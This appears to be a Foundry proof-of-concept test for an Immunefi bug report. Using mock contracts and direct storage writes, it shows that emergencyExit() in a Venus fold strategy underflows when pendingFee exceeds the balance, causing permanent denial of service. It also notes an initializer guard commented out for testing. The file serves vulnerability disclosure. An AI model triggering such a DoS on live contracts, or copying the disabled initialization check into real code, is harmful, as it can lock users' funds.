// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/contracts/venus/VenusFoldStrategy.sol";

/*

NOTE ABOUT INITIALIZATION
-------------------------------------------------------------------------------
The following check in      Initializable.sol     was commented out intentionally:

require(
    (isTopLevelCall && _initialized < 1) ||
    (!Address.isContract(address(this)) && _initialized == 1),
    "Initializable: contract is already initialized"
);

This was done ONLY for testing purposes to allow multiple initializations.
This does NOT reflect production behavior.

*/


//mock cToken
contract CToken {
    string public name = "CToken";
    string public symbol = "CT";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(uint256 _initialSupply) {
        totalSupply = _initialSupply;
        balanceOf[msg.sender] = _initialSupply;
        emit Transfer(address(0), msg.sender, _initialSupply);
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function getCash() external view returns (uint256) {
        return 0;
    }

    //   Supplied: 10,000
    function balanceOfUnderlying(address) external pure returns (uint256) {
        return 10_000 * 1e18; // supplied
    }

    //   Borrowed: 9,500
    function borrowBalanceCurrent(address) external pure returns (uint256) {
        return 9_500 * 1e18; // borrowed
    }

    function underlying() external pure returns (address) {
        return address(0x00222222);
    }
}




//Required for market entry during initialization

contract ComptrollerMock {
    function enterMarkets(address[] memory cTokens)
        external
        pure
        returns (uint[] memory)
    {
        uint[] memory results = new uint[](cTokens.length);
        for (uint i = 0; i < cTokens.length; i++) {
            results[i] = 0;
        }
        return results;
    }
}


//Defines fee configuration used by VenusFoldStrategy

contract ControllerMock {

    function platformFeeNumerator() public pure returns (uint256) {
        return 300; // 3% platform fee
    }

    function strategistFeeNumerator() public pure returns (uint256) {
        return 200; // 2% strategist fee
    }

    function profitSharingNumerator() public pure returns (uint256) {
        return 500; // 5% profit sharing
    }

    function feeDenominator() public pure returns (uint256) {
        return 10_000; // basis points
    }
}






// Test Contract

contract Main is Test {
    VenusFoldStrategy strategy;

    CToken ct;
    ComptrollerMock comptroller;
    ControllerMock controller;

    address governance = address(0x000045);

    function setUp() public {
        ct = new CToken(100_000_000 * 1e18);
        comptroller = new ComptrollerMock();
        controller = new ControllerMock();



        // Deploy Storage and configure governance/controller
        Storage store = new Storage();
        store.setGovernance(governance);
        vm.prank(governance);
        store.setController(address(controller));




        // Deploy and initialize strategy
        strategy = new VenusFoldStrategy();
        strategy.initializeBaseStrategy(
            address(store),
            address(0x00222222),
            address(0x00003333),
            address(ct),
            address(comptroller),
            address(0x00778899),
            1000,
            2000,
            3000,
            true
        );



   
        /*
        /// NOTE:
        In this test, this values are set directly to storage because following the full contract flow
        would make the test noisy and unnecessarily complex.
        If a test using the complete natural execution flow of the contract is required,
        you can mention it in the Immunefi report comments _ and I will prepare it as soon as possible.
        */
        vm.store(address(strategy),strategy._STORED_SUPPLIED_SLOT(),bytes32(uint256(400 * 1e18)));
        vm.store(address(strategy),strategy._PENDING_FEE_SLOT(),bytes32(uint256(501 * 1e18)));
    }


/*
===============================================================================
IMPORTANT OBSERVATIONS

- _accrueFee()    increase   pendingFee
- _handleFee()  reduse  pendingFee 
- emergencyExit()    calls _accrueFee()        but SKIPS     _handleFee()
- This allows pendingFee to exceed withdrawable balance
- Result: arithmetic underflow and permanent DoS

flow 👉🏽 emergencyExit()👉🏽_withdrawMaximum()👉🏽 _accrueFee() 👉🏽_redeemMaximum()👉🏽 supplied - borrowed - pendingFee
===============================================================================
*/

    function test_Dos() public {
        vm.startPrank(governance);

        uint256 currentBalance = strategy.currentBalance();
        console.log("current balance ------------------------>", currentBalance);
        // supplied (10000) - borrowed (9500) = 500

        uint256 pending = strategy.pendingFee();
        console.log("pendingFee------------------------------>", pending);
        // pendingFee = 501

        uint256 storedBalance = strategy.storedBalance();
        console.log("storedBalance ------------------------>", storedBalance);
        // storedBalance = 400

        /*
        Underflow occurs here:

        supplied - borrowed - pendingFee
        10000e18 - 9500e18 - 501e18 = -1e18  --> revert
        */

        vm.expectRevert(stdError.arithmeticError);//POC
        strategy.emergencyExit();

        vm.stopPrank();
    }
}
